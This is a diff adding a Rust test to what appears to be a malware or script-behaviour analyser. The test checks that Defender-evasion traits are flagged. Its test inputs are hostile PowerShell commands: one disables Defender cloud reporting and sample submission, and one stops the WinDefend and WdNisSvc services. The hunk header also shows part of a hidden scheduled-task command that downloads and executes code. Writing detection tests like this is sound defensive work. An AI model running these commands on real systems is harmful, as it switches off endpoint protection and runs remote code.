@@ -2925,6 +2925,27 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn set_mppreference_padded_reporting_values_emit_defender_evasion_traits() {
+        let script = br#"powershell -Command "Set-MpPreference -MAPSReporting 0x00000000 -SubmitSamplesConsent 0x00000002""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for (action, target) in [
+            ("setmp-mapsreporting", "0x00000000"),
+            ("setmp-submitsamplesconsent", "0x00000002"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::DefenderEvasion { action: existing_action, target: existing_target }
+                        if existing_action == action && existing_target == target
+                )),
+                "padded Set-MpPreference reporting value was not surfaced for {action}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn powershell_stop_service_name_list_emits_each_defender_evasion_trait() {
         let script = br#"powershell -Command "Stop-Service -Name WinDefend, WdNisSvc -Force""#;
         let report = analyze(script, &AnalyzeConfig::default());
